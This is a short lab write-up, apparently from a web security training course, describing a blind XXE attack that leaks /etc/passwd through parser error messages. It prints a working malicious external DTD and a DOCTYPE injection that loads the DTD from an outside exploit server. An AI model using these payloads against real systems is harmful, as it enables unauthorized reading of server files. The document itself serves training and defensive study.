Blind XML External Entity to Retrieve /etc/passwd via Error Messages

Category: XML External Entity (XXE)
Difficulty: Practitioner

Overview / What I Learned
This lab demonstrates a blind XXE vulnerability where the application parses XML input but does not display the result directly.
The key was to use an external DTD hosted on a separate server to trigger an error message that leaks the contents of /etc/passwd.
Learned how to craft external DTDs with parameter entities to force the server into an error revealing sensitive file contents.

Exploit Steps / Attack Methodology
1. Preparing the Malicious DTD
Accessed the labâ€™s exploit server to host an external DTD file.

Created a malicious DTD with the following content:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
This DTD reads the /etc/passwd file into the %file; entity, then triggers an invalid file path error including that file content.

2. Crafting the Malicious XML Payload
Navigated to a product page and clicked Check stock to intercept the XML POST request in Burp Suite.

Injected the following DOCTYPE declaration before the root element:

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-server.com/malicious.dtd"> %xxe;]>
Replaced the URL with the actual URL where the malicious DTD was hosted.

3. Sending the Exploit and Retrieving the Data
Forwarded the modified request with the injected external entity.

The server attempted to parse the external DTD and threw an error message containing the contents of /etc/passwd.
